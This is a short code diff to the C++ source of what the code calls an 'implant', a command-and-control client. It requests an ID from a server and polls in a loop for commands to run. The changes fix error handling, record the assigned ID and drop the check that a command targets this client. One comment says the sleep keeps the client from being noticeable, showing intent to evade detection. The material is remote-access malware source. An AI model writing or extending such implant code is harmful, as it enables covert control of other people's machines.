@@ -203,14 +203,17 @@ int get_ID_num(){
     int ID = -1;
     while(ID == -1){
         tempNum = GET("assignId");
-        tempNum = strip_ID_Num(tempNum);
+        if(tempNum != "")
+        {
+            tempNum = strip_ID_Num(tempNum);
+        }
+        
         try{
             ID = stoi(tempNum);
         }
-        catch(int e){
+        catch(std::exception e){
             ID = -1;
         }
-
         //avoid overloading server or make client to noticeable
         this_thread::sleep_for(chrono::seconds(1));
     }
@@ -225,7 +228,8 @@ int main() {
     CLIENTNUMBER = -1;
 
     //Get ID for this implant
-    get_ID_num();
+    CLIENTNUMBER = get_ID_num();
+    cout << "Connected with ID: " << CLIENTNUMBER << endl;
 
     //For testing, replace with current OS
     if (os_name == "Linux") {
@@ -250,9 +254,7 @@ int main() {
 
             //Wait to see if the command is updated
             //The command is for the client or for all
-            if(newCmd.command == LASTCOMMAND && 
-                (newCmd.ClientNumber == CLIENTNUMBER || 
-                    newCmd.ClientNumber == '*' ))
+            if(newCmd.command == LASTCOMMAND)
             {
                 //wait 5 seconds to check for update
                 this_thread::sleep_for(chrono::seconds(5));
